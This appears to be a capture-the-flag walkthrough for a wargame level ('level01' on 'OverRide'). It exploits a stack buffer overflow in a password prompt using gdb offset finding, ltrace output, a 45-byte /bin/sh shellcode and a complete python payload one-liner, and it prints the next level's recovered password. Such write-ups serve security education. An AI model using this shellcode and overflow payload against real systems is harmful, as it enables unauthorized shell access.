# Walkthrough

## Solution
```
(python -c "print 'dat_will' + '\n' + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'A' * 35 + '\xdc\xd6\xff\xff'"; cat -) | ./level01 
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```  

## Explanation

### Execution

```
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...
```  
-> The program asks for a username


### Disassembly

```
info var
0x0804a040  a_user_name

info func
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
```

You can view the commented asm code [here](resources/disassembly.asm)  
You can view the asm code translated to C [here](source.c)  

### Steps

The programs asks for a username, and a password if the username is "dat_will".
The password is admin.
However, there is no syscall to a shell -> use a shellcode.

- Find the offset
The program does not segfault when it prompts for the username.  
But it does for the password.  

```
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
verifying username....

nope, incorrect username...

[Inferior 1 (process 1824) exited with code 01]
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```  
-> The offset is at 80.

- Find the address where the password is saved  

```
(gdb) break *0x0804857d
Breakpoint 1 at 0x804857d
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
hello

Breakpoint 1, 0x0804857d in main ()
(gdb) display/i $pc
1: x/i $pc
=> 0x804857d <main+173>:	mov    %eax,(%esp)
(gdb) x/s $eax
0xffffd6bc:	 "hello\n"

------------------

level01@OverRide:~$ ltrace ./level01 
__libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)                       = 39
printf("Enter Username: ")                                        = 16
fgets(Enter Username: dat_will
"dat_will\n", 256, 0xf7fcfac0)                              = 0x0804a040
puts("verifying username....\n"verifying username....

)                                  = 24
puts("Enter Password: "Enter Password: 
)                                          = 17
fgets(hello
"hello\n", 100, 0xf7fcfac0)                                 = 0xffffd6dc <-- address that stores the return address of the fgets(password)
puts("nope, incorrect password...\n"nope, incorrect password...

)                             = 29
+++ exited (status 1) +++

```

- Shellcode (45 char)  
```
'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
```

Payload: "dat_will" + "\n" (to terminate the 1st fgets) + shellcode + 35 * "A" (80 - 45 (shellcode)) + return address of 2nd fgets  

> (python -c "print 'dat_will' + '\n' + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'A' * 35 + '\xdc\xd6\xff\xff'"; cat -) | ./level1